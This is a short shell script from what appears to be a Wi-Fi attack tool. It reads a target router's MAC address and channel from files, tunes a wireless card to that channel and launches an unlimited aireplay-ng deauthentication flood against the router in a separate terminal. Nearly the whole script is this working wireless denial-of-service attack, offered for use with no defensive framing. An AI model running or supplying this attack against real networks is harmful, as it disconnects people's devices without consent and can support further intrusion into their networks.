#!/bin/sh
deviceName=$(cat "source/deviceName.txt"); 
routerMac=$(cat "source/routerMac.txt"); 
routerChannel=$(cat "source/routerChannel.txt");
version=$(cat "source/version.txt");
clear 
echo "================================================="
echo "wifi tool: MrLaki5: $version"
echo "================================================="
echo "Using device: $deviceName";
echo "Router MAC: $routerMac";
echo "Router channel: $routerChannel";
sudo iwconfig $deviceName channel $routerChannel
echo "Device channel set"
temp1=$(gnome-terminal -- sudo aireplay-ng --deauth 0 -a $routerMac $deviceName)
echo "Deauthentication packages sending in another terminal"
read -p "Press enter to continue..." temp
#etc
